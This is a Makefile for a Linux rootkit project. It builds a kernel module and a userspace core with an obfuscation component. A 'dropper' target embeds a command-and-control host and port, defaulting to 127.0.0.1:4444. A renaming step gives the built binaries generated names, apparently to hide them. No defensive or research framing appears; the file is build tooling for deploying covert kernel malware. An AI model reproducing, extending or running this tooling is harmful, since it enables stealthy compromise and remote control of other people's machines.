obj-m += rk.o
rk-objs := rootkit.o obfs.o

# Kernel version: use .target_kver if present, else running kernel
KVER ?= $(shell cat .target_kver 2>/dev/null || uname -r)
KDIR := /lib/modules/$(KVER)/build
PWD  := $(shell pwd)

all: gen_name _build_module _build_core _rename

# Save target kernel version and install matching headers on host
setup:
	@if [ -z "$(TARGET)" ]; then \
		echo "Usage: make setup TARGET=<uname -r output>"; \
		echo "Example: make setup TARGET=6.6.0"; \
		exit 1; \
	fi
	echo "$(TARGET)" > .target_kver
	@echo "[*] kernel cible : $(TARGET)"
	@if [ ! -d "/lib/modules/$(TARGET)/build" ]; then \
		echo "[*] installation linux-headers-$(TARGET)..."; \
		sudo apt-get install -y linux-headers-$(TARGET); \
	else \
		echo "[+] headers déjà présents : /lib/modules/$(TARGET)/build"; \
	fi

gen_name:
	gcc -Wall -Wextra -o gen_name gen_name.c

_build_module:
	@echo "[*] build module pour kernel $(KVER)"
	make -C $(KDIR) M=$(PWD) modules

_build_core:
	gcc -Wall -Wextra -static -I$(PWD) -o rootkit core.c obfs.c

C2   ?= 127.0.0.1
PORT ?= 4444

dropper:
	gcc -Wall -Wextra -static \
	    -DC2_HOST='"$(C2)"' -DC2_PORT=$(PORT) \
	    -I$(PWD) -o dropper dropper.c obfs.c

_rename: gen_name _build_module _build_core
	$(eval RK_NAME := $(shell ./gen_name))
	mv rk.ko       $(RK_NAME).ko
	mv rootkit     $(RK_NAME)
	echo "$(RK_NAME)" > .rk_name
	@echo "[+] binaires renommés : $(RK_NAME) / $(RK_NAME).ko"

clean:
	make -C $(KDIR) M=$(PWD) clean
	rm -f rootkit gen_name

.PHONY: all setup gen_name _build_module _build_core _rename dropper clean
